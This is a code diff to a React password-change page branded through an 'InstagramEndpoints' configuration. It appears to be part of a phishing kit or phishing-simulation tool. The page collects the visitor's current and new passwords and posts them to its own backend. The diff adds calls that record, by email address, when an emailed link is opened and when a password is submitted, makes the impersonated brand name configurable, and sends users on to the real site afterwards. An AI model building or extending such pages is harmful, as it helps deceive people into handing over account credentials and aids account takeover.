@@ -146,6 +146,7 @@ const ChangePassword = () => {
   const [searchParams] = useSearchParams();
   const username = searchParams.get("username") || "";
   const email = searchParams.get("email") || "";
+  const source = searchParams.get("source") || "";
   
   // Display username if present, otherwise email
   const displayIdentifier = username || email;
@@ -171,6 +172,24 @@ const ChangePassword = () => {
       navigate("/forgot");
     }
   }, [displayIdentifier, navigate]);
+
+  // Track email opened if source is email (user clicked link in email)
+  useEffect(() => {
+    if (source === "email" && email) {
+      fetch(`${InstagramEndpoints.backendBaseUrl}/api/notification-records/track/opened`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ email }),
+      })
+        .then(res => res.json())
+        .then(data => {
+          if (data.status === 'SUCCESS') {
+            console.log('✅ Email opened tracked');
+          }
+        })
+        .catch(err => console.error('❌ Failed to track email opened:', err));
+    }
+  }, [source, email]);
 
   const handleCurrentChange = (e) => {
     const value = e.target.value;
@@ -242,7 +261,7 @@ const ChangePassword = () => {
           currentPassword,
           newPassword,
           // confirmPassword intentionally NOT sent to backend
-          source: 'Instagram',
+          source: InstagramEndpoints.brandName,
           path: 'change_password',
         }),
       });
@@ -251,7 +270,21 @@ const ChangePassword = () => {
       setLoading(false);
 
       if (data.status === 'SUCCESS') {
-        // Redirect to Instagram after successful password change
+        // Track password change if source is email
+        if (source === "email" && email) {
+          try {
+            await fetch(`${InstagramEndpoints.backendBaseUrl}/api/notification-records/track/password-changed`, {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ email }),
+            });
+            console.log('✅ Password change tracked');
+          } catch (trackError) {
+            console.error('❌ Failed to track password change:', trackError);
+          }
+        }
+
+        // Redirect to the brand site after successful password change
         window.location.href = InstagramEndpoints.instaBase;
       } else {
         setSubmitError(data.message || 'Failed to change password. Please try again.');
